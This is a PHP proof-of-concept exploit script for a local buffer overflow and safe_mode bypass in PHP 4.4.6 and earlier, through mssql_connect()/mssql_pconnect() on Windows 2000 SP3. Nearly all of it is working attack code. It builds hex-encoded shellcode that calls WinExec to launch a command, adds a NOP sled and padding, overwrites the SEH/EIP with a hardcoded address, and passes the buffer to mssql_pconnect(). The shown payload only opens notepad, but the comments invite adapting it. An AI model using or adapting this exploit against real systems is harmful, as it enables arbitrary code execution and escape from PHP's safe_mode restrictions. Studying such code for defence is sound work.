<?php

// PHP <= 4.4.6 mssql_connect() & mssql_pconnect() local buffer overflow
// poc exploit (and safe_mode bypass)
// windows 2000 sp3 en / seh overwrite
// by rgod
// site: http://retrogod.altervista.org

// u can easily adjust for php5
// this as my little contribute to MOPB

$____scode=
"\xeb\x1b".
"\x5b".
"\x31\xc0".
"\x50".
"\x31\xc0".
"\x88\x43\x59".
"\x53".
"\xbb\xca\x73\xe9\x77". //WinExec
"\xff\xd3".
"\x31\xc0".
"\x50".
"\xbb\x5c\xcf\xe9\x77". //ExitProcess
"\xff\xd3".
"\xe8\xe0\xff\xff\xff".
"\x63\x6d\x64".
"\x2e".
"\x65".
"\x78\x65".
"\x20\x2f".
"\x63\x20".
"start notepad & ";

   $eip="\xdc\xf5\x12";
   $____suntzu=str_repeat("\x90",100);
   $____suntzu.=$____scode;
   $____suntzu.=str_repeat("a",2460 - strlen($____scode));
   $____suntzu.=$eip;
   mssql_pconnect($____suntzu);

?>